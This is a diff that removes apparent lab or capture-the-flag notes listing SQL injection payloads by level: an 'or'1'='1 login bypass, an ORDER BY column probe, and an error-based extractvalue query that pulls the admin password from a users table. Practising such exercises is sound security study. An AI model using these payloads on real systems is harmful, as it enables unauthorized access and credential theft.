@@ -1,8 +1,0 @@
-challenge1
-'or'1'='1
-
-challenge
-ORDER BY 1-- -
-
-level 3 
-http://localhost/.../detail.php?id=1 AND extractvalue(1, concat(0x3a, (SELECT password FROM users WHERE username='admin')))
